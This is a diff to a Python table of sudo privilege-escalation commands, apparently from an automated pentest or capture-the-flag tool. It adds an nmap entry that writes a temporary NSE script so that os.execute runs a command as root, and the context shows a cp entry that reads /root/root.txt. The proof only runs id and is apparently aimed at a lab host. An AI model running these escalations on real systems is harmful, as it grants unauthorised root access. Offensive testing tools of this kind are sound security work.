@@ -107,6 +107,23 @@ GTFOBINS: dict[str, dict[str, str]] = {
     "cp": {
         "sudo": "sudo {path} /root/root.txt /tmp/omni_proof && sudo /bin/cat /tmp/omni_proof",
     },
+    # Theseus (2026-10-30): ``(root) NOPASSWD: /usr/bin/nmap`` is the whole
+    # privilege boundary of the Minos host, and nmap has no flag that runs a
+    # program. The proof writes a minimal NSE script and loads it: the chunk
+    # body executes as root when nmap parses the file, before any scan. The two
+    # required fields (``action``/``portrule``) are not decoration: without them
+    # nmap aborts at load with exit 1 *after* printing the uid line, and an
+    # ``ssh_exec`` that only accepts exit 0 would report the proof as a failure.
+    # ``os.execute`` goes last so the fields exist before the engine validates
+    # them. Measured against nmap 7.991: exit 0 with the ``uid=`` line on stdout.
+    "nmap": {
+        "sudo": (
+            "T=$(mktemp); printf '%s\\n' 'action = function() end' "
+            "'portrule = function() return false end' "
+            "'os.execute(\"/usr/bin/id\")' > $T; "
+            "sudo {path} --script=$T -p 1 -n 127.0.0.1"
+        ),
+    },
 }
 
 VECTOR_RANK = {"sudo": 0, "capabilities": 1, "suid": 2}
